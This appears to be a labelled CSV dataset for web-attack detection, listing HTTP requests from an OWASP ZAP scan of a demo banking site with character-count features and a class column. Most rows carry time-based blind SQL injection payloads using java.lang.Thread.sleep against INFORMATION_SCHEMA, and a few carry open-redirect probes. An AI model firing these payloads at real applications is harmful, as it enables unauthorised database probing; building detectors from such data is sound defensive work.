method,path,body,single_q,double_q,dashes,braces,spaces,percentages,semicolons,angle_brackets,special_chars,path_length,body_length,badwords_count,class
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27,,2,0,0,0,3,0,1,0,0,107,0,0,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=http%3A%2F%2F6542095270498749340.owasp.org&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,160,0,1
GET,/static/index.jsp?content=https%3A%2F%2F6542095270498749340.owasp.org,,0,0,0,0,0,0,0,0,0,63,0,0,1
GET,/Privacypolicy.jsp?sec=Careers%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&template=US,,5,2,1,2,17,0,0,0,0,206,0,4,1
GET,/images/index.jsp?content=personal.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,77,0,1,1
GET,/disclaimer.htm?url=http%3A%2F%2Fwww.netscape.com+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,206,0,4,1
GET,/index.jsp?content=inside_volunteering.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,81,0,1,1
GET,/Documents/JohnSmith/index.jsp?content=personal.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,215,0,4,1
GET,/survey_questions.jsp?step=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,14,0,1,0,0,178,0,4,1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,4,3,1,1,14,0,1,0,0,12,174,4,1
POST,/sendFeedback,cfile=comments.txt&name=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,3,1,1,21,0,1,0,0,13,272,4,1
POST,/doLogin,uid=ZAP&passw=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&btnSubmit=Login,4,3,1,1,14,0,1,0,0,8,181,5,1
GET,/search.jsp?query=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,169,0,4,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,3,0,0,0,0,93,0,1,1
GET,/static/index.jsp?content=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,177,0,4,1
GET,/images/index.jsp?content=personal.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,201,0,4,1
GET,/Privacypolicy.jsp?sec=Careers&template=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,190,0,4,1
GET,/index.jsp?content=inside_jobs.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&job=MortgageLendingAccountExecutive%3ASales,,4,2,1,2,17,0,0,0,0,239,0,4,1
GET,/disclaimer.htm?url=http%3A%2F%2Fwww.netscape.com%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,207,0,4,1
GET,/survey_questions.jsp?step=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,178,0,4,1
GET,/index.jsp?content=inside_volunteering.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,205,0,4,1
POST,/sendFeedback,cfile=comments.txt&name=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,2,1,1,21,0,1,0,0,13,272,4,1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,4,2,1,1,14,0,1,0,0,12,174,4,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,6,0,0,0,0,118,0,1,1
POST,/doLogin,uid=ZAP&passw=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&btnSubmit=Login,4,2,1,1,14,0,1,0,0,8,181,5,1
GET,/static/index.jsp?content=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,177,0,4,1
GET,/search.jsp?query=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,49,0,1,1
GET,/Privacypolicy.jsp?sec=Careers&template=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,14,0,1,0,0,191,0,4,1
GET,/index.jsp?content=inside_jobs.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&job=MortgageLendingAccountExecutive%3ASales,,5,2,1,2,17,0,0,0,0,240,0,4,1
GET,/images/index.jsp?content=personal.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,202,0,4,1
GET,/survey_questions.jsp?step=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,178,0,4,1
GET,/index.jsp?content=inside_volunteering.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,206,0,4,1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%22java.lang.Thread.sleep%22%2815000%29,0,2,0,1,0,0,0,0,0,12,54,1,1
POST,/doLogin,uid=ZAP&passw=%22java.lang.Thread.sleep%22%2815000%29&btnSubmit=Login,0,2,0,1,0,0,0,0,0,8,61,2,1
GET,/static/index.jsp?content=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,57,0,1,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,7,0,0,0,0,122,0,1,1
POST,/sendFeedback,cfile=comments.txt&name=%22java.lang.Thread.sleep%22%2815000%29&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,2,0,1,7,0,0,0,0,13,152,1,1
GET,/search.jsp?query=ZAP+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,3,0,0,0,0,56,0,1,1
GET,/Privacypolicy.jsp?sec=Careers&template=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,191,0,4,1
GET,/index.jsp?content=inside_jobs.htm&job=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,189,0,4,1
GET,/survey_questions.jsp?step=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,58,0,1,1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe+%2F+%22java.lang.Thread.sleep%22%2815000%29+,0,2,0,1,3,0,0,0,0,12,67,1,1
POST,/doLogin,uid=ZAP&passw=ZAP+%2F+%22java.lang.Thread.sleep%22%2815000%29+&btnSubmit=Login,0,2,0,1,3,0,0,0,0,8,68,2,1
GET,/static/index.jsp?content=personal_checking.htm+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,3,0,0,0,0,82,0,1,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,7,0,0,0,0,122,0,1,1
GET,/search.jsp?query=ZAP%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,4,0,0,0,0,60,0,1,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP+%2F+%22java.lang.Thread.sleep%22%2815000%29+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,2,0,1,10,0,0,0,0,13,159,1,1
GET,/index.jsp?content=inside_jobs.htm&job=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,14,0,1,0,0,190,0,4,1
GET,/Privacypolicy.jsp?sec=Careers&template=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,191,0,4,1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,2,2,0,1,4,0,0,0,0,12,71,1,1
GET,/static/index.jsp?content=personal_checking.htm%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,4,0,0,0,0,86,0,1,1
GET,/survey_questions.jsp?step=d+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,3,0,0,0,0,63,0,1,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,20,0,0,0,0,246,0,4,1
POST,/doLogin,uid=ZAP&passw=ZAP%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&btnSubmit=Login,2,2,0,1,4,0,0,0,0,8,72,2,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,2,0,1,11,0,0,0,0,13,163,1,1
GET,/search.jsp?query=ZAP%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,60,0,1,1
GET,/index.jsp?content=inside_jobs.htm&job=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,190,0,4,1
GET,/Privacypolicy.jsp?sec=Careers&template=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,71,0,1,1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,0,4,0,1,4,0,0,0,0,12,71,1,1
GET,/static/index.jsp?content=personal_checking.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,86,0,1,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,20,0,0,0,0,247,0,4,1
GET,/survey_questions.jsp?step=d%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,4,0,0,0,0,67,0,1,1
GET,/search.jsp?query=ZAP+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,184,0,4,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,4,0,1,11,0,0,0,0,13,163,1,1
POST,/doLogin,uid=ZAP&passw=ZAP%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&btnSubmit=Login,0,4,0,1,4,0,0,0,0,8,72,2,1
GET,/index.jsp?content=inside_jobs.htm&job=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,190,0,4,1
GET,/Privacypolicy.jsp?sec=Careers&template=US+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,3,0,0,0,0,77,0,1,1
GET,/static/index.jsp?content=personal_checking.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,210,0,4,1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,4,2,1,2,17,0,0,0,0,12,195,4,1
GET,/survey_questions.jsp?step=d%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,67,0,1,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,2,1,2,24,0,0,0,0,13,287,4,1
POST,/doLogin,uid=ZAP&passw=ZAP+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&btnSubmit=Login,4,2,1,2,17,0,0,0,0,8,196,5,1
GET,/search.jsp?query=ZAP%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,185,0,4,1
GET,/index.jsp?content=inside_jobs.htm&job=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,70,0,1,1
GET,/Privacypolicy.jsp?sec=Careers&template=US%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,4,0,0,0,0,81,0,1,1
